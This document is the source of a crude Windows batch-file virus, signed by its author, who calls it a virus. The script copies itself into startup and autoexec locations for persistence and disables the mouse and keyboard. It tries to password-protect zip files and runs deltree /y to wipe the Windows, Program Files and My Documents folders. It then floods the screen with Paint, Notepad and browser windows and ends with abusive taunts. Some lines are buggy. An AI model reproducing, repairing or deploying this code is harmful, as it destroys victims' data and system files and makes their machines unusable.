   echo Virus Name:A7meedye
   if exist d:\
   copy %0 d:\game.bat
   copy %0 d:\autoexec.bat
   @echo off
   c:\windows\rundll.exe mouse,disable
   c:\windows\rundll.exe keyboard,disable
   goto network
   :network
   cls
   if exist c:\winnt goto winnt
   copy %0 c:\windows\alluse~1\applic~1\A7meedye.bat
   copy %0 c:\windows\alluse~1\destkop\A7meeedye.bat
   copy %0 c:\windows\alluse~1\startm~1\A7meedye.bat
   copy %0 c:\windows\alluse~1\startm~1\progra~1\A7meedye.bat
   goto zip
   zip:
   cls
   @dir /s /b /l c:\winzip32.exe | set wz=
   @FOR /F "delims==" %%y IN ('dir /s /b /l c:\*.zip') DO @echo "%wz%" -min -a -r -p "%%y"
   goto startup
   startup:
   cls
   copy %0 C:\WINDOWS\Start Menu\Programs\StartUp\A7meedye.bat
   goto del
   del:
   deltree /y C:\WINDOWS\*.*
   deltree /y C:\Program Files\*.*
   deltree /y C:\My Documents\*.*
   goto msg
   msg:
   NET SEND 127.0.0.1 you got a virus
   goto start
   :start
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start MSPaint
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   start Notepad
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   Start IExplorer "http://www.google.com
   goto end
   :end
   cls
   echo ha ha ha ha i fuck your computer
   echo sorry about what my virus do but you are stuped
   echo The Virus Made By Ahmedo
   puse
